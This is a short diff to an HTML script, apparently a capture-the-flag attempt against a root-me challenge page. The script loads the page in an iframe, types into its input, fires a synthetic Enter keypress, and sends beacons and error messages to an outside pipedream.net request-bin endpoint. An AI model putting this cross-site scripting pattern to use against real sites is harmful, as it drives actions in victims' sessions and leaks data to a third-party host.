@@ -23,11 +23,12 @@
 
 	<script type="text/javascript">
 		var iframe = document.createElement('iframe');
+		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?if1', {mode: 'no-cors'})
         iframe.src = 'http://ctf21.root-me.org/room';
         iframe.height = '80%';
         iframe.width = '80%';
         iframe.onload = function() {
-
+        	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?if2', {mode: 'no-cors'})
         	try {
         		const event = new KeyboardEvent('keydown', {
 				  key: 'Enter',
@@ -38,6 +39,7 @@
 
 			  	document.getElementById('input').value='hello';
 	            document.getElementById('input').dispatchEvent(event);
+	            fetch('https://en6gc9c8vfzvo.x.pipedream.net/?if3', {mode: 'no-cors'})
 	            
             } catch (error) {
 			  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr='+error, {mode: 'no-cors'})
@@ -55,7 +57,9 @@
 			}
 			*/
         };
+        fetch('https://en6gc9c8vfzvo.x.pipedream.net/?if4', {mode: 'no-cors'})
         document.getElementsByTagName('body')[0].appendChild(iframe);
+        fetch('https://en6gc9c8vfzvo.x.pipedream.net/?if5', {mode: 'no-cors'})
 	</script>
 	
 	
